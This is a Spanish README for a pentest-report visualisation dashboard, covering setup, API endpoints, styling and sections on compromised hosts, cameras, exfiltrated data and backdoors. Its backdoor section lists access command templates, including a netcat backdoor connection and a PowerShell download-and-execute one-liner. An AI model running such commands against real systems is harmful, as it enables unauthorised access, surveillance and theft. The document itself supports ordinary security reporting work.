# 🌐 Frontend Web para Reportes de Pentesting

Frontend web elegante para visualizar reportes de pruebas de penetración de forma interactiva y atractiva.

## 🚀 Características

### 📊 **Visualización Elegante**
- **Diseño moderno**: Interfaz limpia y profesional
- **Colores temáticos**: Esquema de colores coherente
- **Responsive**: Adaptable a diferentes tamaños de pantalla
- **Animaciones**: Transiciones suaves y efectos visuales

### 📋 **Secciones Informativas**
- **Información del escaneo**: Detalles básicos y estado
- **Estadísticas**: Resumen numérico de resultados
- **Fases del pentest**: Estado de cada fase completada
- **Sistemas comprometidos**: Lista de hosts comprometidos
- **Dispositivos IoT**: Cámaras y dispositivos accesibles
- **Bases de datos**: Conexiones establecidas
- **Datos exfiltrados**: Archivos y tamaños
- **Mapa de red**: Topología descubierta

### 🔐 **Persistencia y Backdoors**
- **Lista detallada**: Todos los backdoors establecidos
- **Información de acceso**: IPs, puertos, credenciales
- **Instrucciones de uso**: Comandos para cada tipo de backdoor
- **Acciones disponibles**: Qué se puede hacer con cada acceso

### 🧊 **Soporte para Pentest Frío**
- **Identificación visual**: Marcado especial para pentests fríos
- **Advertencias**: Avisos de que los datos son solo de referencia
- **Estado de limpieza**: Información sobre lo que fue eliminado

## 🛠️ Instalación y Uso

### **1. Iniciar el Servidor**
```bash
# Desde el directorio raíz del proyecto
cd web_frontend
python start_server.py

# O directamente
python server.py
```

### **2. Acceder al Frontend**
- Abrir navegador en: `http://localhost:8080`
- Seleccionar un escaneo de la lista
- Explorar los resultados de forma interactiva

### **3. Personalizar Puerto**
```bash
# Cambiar puerto (por defecto 8080)
python server.py 9090

# Cambiar host y puerto
python server.py 9090 0.0.0.0
```

## 📁 Estructura de Archivos

```
web_frontend/
├── index.html              # Página principal
├── server.py               # Servidor HTTP
├── start_server.py         # Script de inicio
├── README.md              # Documentación
└── static/
    ├── css/
    │   └── style.css      # Estilos CSS
    └── js/
        └── app.js         # JavaScript del frontend
```

## 🔧 API Endpoints

### **GET /api/scans**
Obtiene la lista de todos los escaneos disponibles.

**Respuesta:**
```json
[
  {
    "scan_id": "pentest_20250106_143022",
    "mote": "mi_escaneo",
    "status": "completed",
    "is_cold_pentest": false,
    "created_at": "2025-01-06T14:30:22",
    "completed_at": "2025-01-06T15:45:30",
    "description": "Escaneo de prueba"
  }
]
```

### **GET /api/scan/{scan_id}**
Obtiene los detalles completos de un escaneo específico.

**Respuesta:**
```json
{
  "scan_id": "pentest_20250106_143022",
  "mote": "mi_escaneo",
  "status": "completed",
  "is_cold_pentest": false,
  "results": {
    "reconnaissance": { ... },
    "lateral_movement": { ... },
    "persistence": { ... }
  }
}
```

## 🎨 Personalización

### **Colores y Temas**
Editar `static/css/style.css` para personalizar:
- Colores principales
- Esquemas de colores
- Tipografías
- Espaciado

### **Funcionalidad**
Editar `static/js/app.js` para agregar:
- Nuevas secciones
- Funcionalidades adicionales
- Integraciones con APIs externas

## 🔍 Tipos de Backdoors Soportados

### **🔌 Netcat**
- **Comando**: `nc IP PUERTO`
- **Uso**: Conexión directa al backdoor
- **Acciones**: Ejecutar comandos, transferir archivos

### **💻 PowerShell**
- **Comando**: `powershell -c "IEX (New-Object Net.WebClient).DownloadString('URL')"`
- **Uso**: Ejecutar payloads PowerShell
- **Acciones**: Descargar y ejecutar scripts

### **📹 Acceso a Cámaras**
- **Comando**: `ffplay rtsp://usuario:password@IP:puerto/stream`
- **Uso**: Ver stream de la cámara
- **Acciones**: Monitoreo visual, grabación

### **🗄️ Conexiones de Base de Datos**
- **Comando**: `mysql -h IP -P PUERTO -u usuario -ppassword`
- **Uso**: Conectar a la base de datos
- **Acciones**: Consultar datos, modificar registros

### **🖥️ Compromiso de Sistema**
- **Comando**: `ssh usuario@IP`
- **Uso**: Acceso SSH al sistema
- **Acciones**: Ejecutar comandos, transferir archivos

## 🧊 Pentest Frío

### **Identificación Visual**
- **Badge**: 🧊 FRÍO en listados
- **Título**: "Pentest Frío" en detalles
- **Advertencias**: Avisos de que los datos son solo de referencia

### **Información de Limpieza**
- **Reporte de limpieza**: Detalle de lo eliminado
- **Estado especial**: `completed_cold` o `error_cold`
- **Advertencias**: Avisos en gestión de escaneos

## 🚀 Características Técnicas

### **Frontend**
- **HTML5**: Estructura semántica
- **CSS3**: Estilos modernos con gradientes y animaciones
- **JavaScript ES6**: Funcionalidad interactiva
- **Font Awesome**: Iconos profesionales
- **Google Fonts**: Tipografía Inter

### **Backend**
- **Python HTTP Server**: Servidor simple y eficiente
- **JSON API**: Endpoints RESTful
- **MIME Types**: Soporte para archivos estáticos
- **CORS**: Acceso desde cualquier origen

### **Integración**
- **Escaneos automáticos**: Detecta escaneos en directorio `scans/`
- **Reportes dinámicos**: Carga datos en tiempo real
- **Evidencia**: Acceso a archivos de evidencia
- **Logs**: Integración con sistema de logging

## 🔧 Solución de Problemas

### **Servidor no inicia**
```bash
# Verificar que el puerto esté libre
netstat -an | grep 8080

# Cambiar puerto
python server.py 9090
```

### **No se muestran escaneos**
```bash
# Verificar directorio de escaneos
ls -la scans/

# Verificar permisos
chmod -R 755 scans/
```

### **Errores de CORS**
- El servidor incluye headers CORS por defecto
- Si persisten problemas, verificar configuración del navegador

## 📝 Notas de Desarrollo

### **Agregar Nuevas Secciones**
1. Agregar HTML en `index.html`
2. Agregar estilos en `style.css`
3. Agregar lógica en `app.js`
4. Actualizar API si es necesario

### **Personalizar Colores**
```css
:root {
  --primary-color: #667eea;
  --secondary-color: #764ba2;
  --success-color: #48bb78;
  --warning-color: #ed8936;
  --error-color: #f56565;
}
```

### **Agregar Nuevos Tipos de Backdoors**
1. Actualizar `getBackdoorTypeIcon()` en `app.js`
2. Agregar casos en `getBackdoorActions()`
3. Actualizar estilos si es necesario

## 🎯 Casos de Uso

### **Presentaciones**
- Mostrar resultados de pentesting de forma profesional
- Demostrar capacidades sin exponer credenciales reales
- Visualizar progreso de escaneos en tiempo real

### **Análisis**
- Revisar resultados de forma organizada
- Identificar patrones en compromisos
- Planificar próximos pasos

### **Reportes**
- Generar documentación visual
- Compartir resultados con stakeholders
- Mantener historial de escaneos

---

**¡Disfruta visualizando tus reportes de pentesting de forma elegante!** 🎉
